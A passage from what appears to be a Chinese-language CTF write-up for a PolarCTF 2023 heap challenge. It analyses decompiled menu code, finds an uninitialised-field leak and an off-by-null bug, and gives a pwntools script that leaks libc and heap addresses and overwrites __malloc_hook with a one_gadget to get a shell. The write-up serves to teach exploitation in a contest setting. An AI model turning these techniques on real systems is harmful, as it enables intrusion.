class="string">&quot;.............:::::::::::::...........:===++++++++++=:............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;...............:::::::::::::.........===++*+-=***+++=............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;................::::::::::::::......-=+++*=...-*++++=............................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;..................:::::::::::::....-==+++-.....=++++=:...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;....................:::::::::::::..==+++-.......+++++-...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;......................::::::::::::-=++*=........:*+++=...........................................\n&quot;</span></span><br><span class="line">    <span class="string">&quot;........................::::::::::=+++-..........:+*++-.........................................:\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.........................::::::::-==+=:...........:+===........................................::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::.......................:::::-==++::::..........====:......................................:::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::----===+=::::::::::::::-+==-:::::::::::::::::::::::::::::::::::::::--\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::::::::::::::::::::-==++:::::::::::::::-+===::::::::::::::::::::::::::::::::::::-----\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::::::::::::::::::::-=++-::::::::::::::::+===:::::::::::::::::::::::::::::::::::::----\n&quot;</span></span><br><span class="line">    <span class="string">&quot;:::::::::::::::::::::::::::::::=++=:::::::::::::::::====:::::::::::::::::::::::::::::::::::::::--\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::::-+++::::::::::::::::::-+++::::::::::::::::::::::::::::::::::::::::-\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::::+#+:::::::::::::::::::::*#-::::::::::::::::::::::::::::::::::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::::##+:::::::::::::::::::::*#*::::::::::::::::::::::::::::::::::::::::\n&quot;</span></span><br><span class="line">    <span class="string">&quot;::::::::::::::::::::::::::::-*###:::::::::::::::::::::###+:::::::::::::::::::::::::::::::::::::::&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v4 = <span class="built_in">sub_A9D</span>();</span><br><span class="line">          <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">sub_BFC</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">sub_D28</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sub_EB3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">sub_1005</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到是一道菜单题。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_BFC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="built_in">sub_B34</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;31m The chicken nest collapsed!!! \x1B[0m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Give me the size of the chicken. \x1B[0m&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">    *((_QWORD *)v2 + <span class="number">1</span>) = <span class="built_in">malloc</span>(*v2);</span><br><span class="line">    *((_QWORD *)v2 + <span class="number">3</span>) = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">    *((_QWORD *)v2 + <span class="number">2</span>) = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Give me the name of the chicken. \x1B[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_B74</span>(*((_QWORD *)v2 + <span class="number">1</span>), (<span class="type">unsigned</span> <span class="type">int</span>)*v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Give the chicken a mark. \x1B[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, *((<span class="type">void</span> **)v2 + <span class="number">2</span>), <span class="number">0x20</span>uLL);</span><br><span class="line">    dword_203060[v1] = <span class="number">1</span>;</span><br><span class="line">    qword_203080[v1] = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_BFC()</code>函数创建了一个结构体，并且可以自定义<code>chicken</code>大小。数组<code>qword_203080</code>记录了每一个<code>chicken</code>,数组<code>dword_203060</code>记录了<code>qword_203060</code>的使用情况。可以向<code>mark</code>和<code>name</code>读入内容。并且未将<code>v2+3</code>处的内容初始化，可能存在泄露。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Chicken</span> &#123;</span><br><span class="line">	<span class="type">int</span> size;</span><br><span class="line">	<span class="type">void</span>* name;</span><br><span class="line">	<span class="type">void</span>* mark;</span><br><span class="line">	<span class="type">void</span>* msg; <span class="comment">// 后面分析得知，这里记载的菜名。</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>根据读入情况，不难分析出结构体的内容。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B34</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !dword_203060[i] )</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_B34()</code>函数用于查看<code>qword_203060</code>数组的使用情况。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *__fastcall <span class="title">sub_B74</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, a1, a2);</span><br><span class="line">  result = &amp;a1[a2];</span><br><span class="line">  *result &amp;= ~<span class="number">1u</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_B74()</code>函数置零操作存在<code>off-by-null</code>漏洞。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_D28</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Which chicken will you kill? \x1B[0m&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( dword_203060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)qword_203080[v1] = <span class="number">0</span>;</span><br><span class="line">    dword_203060[v1] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">8LL</span>));</span><br><span class="line">    *(_QWORD *)(qword_203080[v1] + <span class="number">8LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">16LL</span>));</span><br><span class="line">    *(_QWORD *)(qword_203080[v1] + <span class="number">16LL</span>) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">free</span>(*(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">24LL</span>));</span><br><span class="line">    qword_203080[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;31m The chicken has already been cooked. \x1B[0m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_D28()</code>函数用于释放多块，没有问题。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_EB3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Which chicken will you cook? \x1B[0m&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( dword_203060[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Old name&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[v1] + <span class="number">8LL</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give me new name.&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, *(<span class="type">void</span> **)(qword_203080[v1] + <span class="number">8LL</span>), *(<span class="type">int</span> *)qword_203080[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;New name&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[v1] + <span class="number">8LL</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Give me Cook name.&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_BC0</span>(v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;31m Ni gun ma i u. \x1B[0m&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_EB3()</code>函数用于改名字，并记录菜名。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> __fastcall <span class="title">sub_BC0</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, *(<span class="type">void</span> **)(qword_203080[a1] + <span class="number">24LL</span>), <span class="number">0x80</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_BC0()</code>函数用于读取菜名。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_1005</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The chicken %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">    <span class="keyword">if</span> ( dword_203060[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Name \x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[i] + <span class="number">8LL</span>));</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m ErrMsg \x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[i] + <span class="number">24LL</span>));</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\x1B[1;33m Mark \x1B[0m&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(qword_203080[i] + <span class="number">16LL</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sub_1005()</code>函数用于打印所有信息。这里菜名被标记为<code>ErrMsg</code>。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们可以通过<code>sub_BFC()</code>函数未初始化的<code>ErrMsg(菜名)</code>和<code>sub_1005()</code>来进行信息泄露，得到<code>heap</code>和<code>libc</code>地址。然后利用<code>off-by-null</code>漏洞制造堆块重叠，向<code>fastbin</code>中写入<code>__malloc_hook</code>地址，然后篡改其为<code>one_gadget</code>来获取权限。</p>
<h3 id="前置脚本"><a href="#前置脚本" class="headerlink" title="前置脚本"></a>前置脚本</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">	<span class="keyword">global</span> elf, libc, p</span><br><span class="line">	elf = ELF(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> is_local:</span><br><span class="line">		p = process(<span class="string">&#x27;./562+5Liq5Yiw&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">&#x27;IP&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(p, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size, data, mark</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the size of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give me the name of the chicken. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Give the chicken a mark. \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.send(mark)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">idx</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you kill? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Cook</span>(<span class="params">idx, name, cook</span>):</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m Which chicken will you cook? \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me new name.\n&quot;</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me Cook name.\n&quot;</span>)</span><br><span class="line">	p.send(cook)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Black</span>():</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;5.EXIT.\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>定义了函数接口和前置操作。</p>
<h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">	<span class="keyword">global</span> __malloc_hook, libc_base</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">	Delete(<span class="number">0</span>)</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">20</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">	Black()</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	libc_base = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">	log.success(<span class="string">&quot;libc : 0x%x&quot;</span> % libc_base)</span><br><span class="line">	__malloc_hook = libc_base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br></pre></td></tr></table></figure></div>

<p>本题泄露利用<code>unsorted bin</code>中保存的<code>libc</code>地址与<code>libc</code>基址的固定偏移获取<code>libc</code>基址。因为结构体在初始化时并未初始化<code>ErrMsg</code>的值，并且其大小为<code>0x90</code>，我们申请一个结构体再将其释放，再次申请时可将其从<code>unsorted bin</code>中申请出来，然后可以通过打印函数打印<code>unsorted bin</code>中的内容。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911185916169.png"
                      alt="image-20230911185916169"
                ></p>
<p>在打印前下断点可以看到，此时<code>ErrMsg</code>中保存的值为<code>libc</code>地址。由于<code>libc</code>中的地址固定偏移不受<code>pie</code>和<code>aslr</code>保护影响，可以由此计算出<code>libc</code>基址。</p>
<h3 id="泄露heap地址"><a href="#泄露heap地址" class="headerlink" title="泄露heap地址"></a>泄露heap地址</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_heap</span>():</span><br><span class="line">	<span class="keyword">global</span> heap_addr</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">3</span>)</span><br><span class="line">	Add(<span class="number">0x20</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Cook(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;cccccccn&#x27;</span>);</span><br><span class="line">	Black()</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;\x1B[1;33m ErrMsg \x1B[0m\n&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;cccccccn&#x27;</span>)</span><br><span class="line">	heap_addr = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	log.success(<span class="string">&quot;heap : 0x%x&quot;</span> % heap_addr)</span><br></pre></td></tr></table></figure></div>

<p>堆地址也可以通过<code>unsorted bin</code>的<code>bk</code>指针泄露，我们将两个不连续的<code>non-fast</code>大小的堆块放入<code>unsorted bin</code>中，由于<code>unsorted bin</code>采取先进先出模式，所以我们会将<code>结构体1</code>重新申请出来，它<code>ErrMsg</code>的<code>bk</code>位置便是<code>结构体3</code>的地址。然后通过改名函数将<code>ErrMsg</code>的前八个字节覆盖满，然后便可通过打印函数将堆地址泄露。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911191326440.png"
                      alt="image-20230911191326440"
                ></p>
<p>同样在打印前下一个断点，可以看到其<code>bk</code>位置为一个堆地址。</p>
<h3 id="通过修改-malloc-hook为one-gadget地址get-shell"><a href="#通过修改-malloc-hook为one-gadget地址get-shell" class="headerlink" title="通过修改__malloc_hook为one_gadget地址get_shell"></a>通过修改__malloc_hook为one_gadget地址get_shell</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell</span>():</span><br><span class="line">	Add(<span class="number">0x80</span>, <span class="string">b&#x27;i&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">	Add(<span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x320</span>) + p64(heap_addr+<span class="number">0x190</span>) + p64(heap_addr+<span class="number">0x190</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 4</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 5</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 7</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	Add(<span class="number">0x68</span>, <span class="string">b&#x27;k&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x320</span>), <span class="string">b&#x27;j&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Delete(<span class="number">6</span>)</span><br><span class="line">	Add(<span class="number">0x2D0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2A0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook-<span class="number">0x23</span>) + p64(<span class="number">0xdeadbeef</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 6</span></span><br><span class="line">	Delete(<span class="number">0</span>)</span><br><span class="line">	Delete(<span class="number">1</span>)</span><br><span class="line">	Delete(<span class="number">2</span>)</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">	one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">	Add(<span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+one[<span class="number">1</span>]), <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">	Delete(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></div>

<p>因为<code>Add</code>函数存在<code>off-by-null</code>漏洞，所以我们可以制造一个堆块重叠，将一个<code>fast chunk</code>包含在其中，这里需要注意的时，我们要绕过<code>unlink</code>检查，需要将伪造的<code>fake chunk</code>的<code>fd</code>和<code>bk</code>指向它本身。然后计算好偏移将<code>fast chunk</code>的<code>fd</code>位置改为<code>__malloc_hook</code>附近包含<code>__malloc_hook</code>大小的<code>fake chunk</code>的位置。然后将<code>__malloc_hook</code>改为<code>one_gadget</code>。此时四个<code>one_gadget</code>都无法打通，我们可以<code>free</code>一个错误的<code>chunk</code>来调用<code>malloc_printerr</code>函数，这个函数中存在其他的调用，最后会调用到<code>malloc</code>，然后便可调用<code>one_gadget</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/24/PolarCTF-2023%E7%A7%8B%E8%B5%9B-%E5%A4%95%E9%98%B3%E4%B8%8B%E7%9A%84%E8%88%9E%E8%80%85/image-20230911193221372.png"
                      alt="image-20230911193221372"
